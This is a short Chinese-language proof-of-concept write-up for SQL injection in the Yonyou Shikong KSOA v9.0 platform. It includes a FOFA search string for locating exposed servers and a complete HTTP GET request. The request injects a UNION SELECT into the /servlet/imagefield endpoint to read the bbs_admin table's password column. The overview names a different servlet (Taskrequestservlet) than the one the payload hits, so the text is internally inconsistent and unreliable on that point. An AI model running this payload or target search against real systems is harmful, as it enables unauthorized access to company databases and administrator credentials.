一、产品描述
用友时空KSOA是建立在SOA理念指导下研发的新一代产品，是根据流通企业最前沿的I需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。
二、漏洞概述
用友时空KSOA平台Taskrequestservlet处存在SQL注入。

三、影响范围
用友时空企业信息融通平台KSOA v9.0

fofa: app="用友-时空KSOA"
```
GET
/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))-
-+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection:
```

